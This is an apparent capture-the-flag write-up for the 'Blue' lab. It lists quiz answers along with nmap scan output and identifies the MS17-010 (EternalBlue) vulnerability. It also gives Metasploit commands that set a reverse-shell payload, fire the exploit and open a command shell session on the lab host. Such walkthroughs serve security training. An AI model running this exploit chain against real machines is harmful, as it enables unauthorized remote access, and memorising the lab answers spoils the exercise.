# Blue

# Task1 Recon

How many ports are open with a port number under 1000?
→ 3

```
root@ip-10-10-238-101:~# nmap 10.10.20.71

Starting Nmap 7.60 ( https://nmap.org ) at 2022-06-06 15:14 BST
Nmap scan report for ip-10-10-20-71.eu-west-1.compute.internal (10.10.20.71)
Host is up (0.00068s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown
MAC Address: 02:F6:A4:D1:34:B7 (Unknown)
```

What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)
→　MS17-010

https://isc.sans.edu/forums/diary/ETERNALBLUE+Windows+SMBv1+Exploit+Patched/22304/

# Task2 Gin Access

Exploit the machine and gain a foothold.

Start Metasploit


Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)
→　exploit/windows/smb/ms17_010_eternalblue

https://infosecwriteups.com/cybertalent-exploiting-ms17-010-eternal-blue-on-a-remote-server-mature-blue-lab-18dee68da431

Show options and set the one required value. What is the name of this value? (All caps for submission)
→　RHOSTS

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.238.101    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```




```
msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
```

```
msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.20.71
RHOSTS => 10.10.20.71
'''

'''
exploit -z
```

```
[*] Command shell session 1 opened (10.10.238.101:4444 -> 10.10.20.71:49216) at 2022-06-06 15:46:46 +0100
[+] 10.10.20.71:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.20.71:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.20.71:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Session 1 created in the background.

```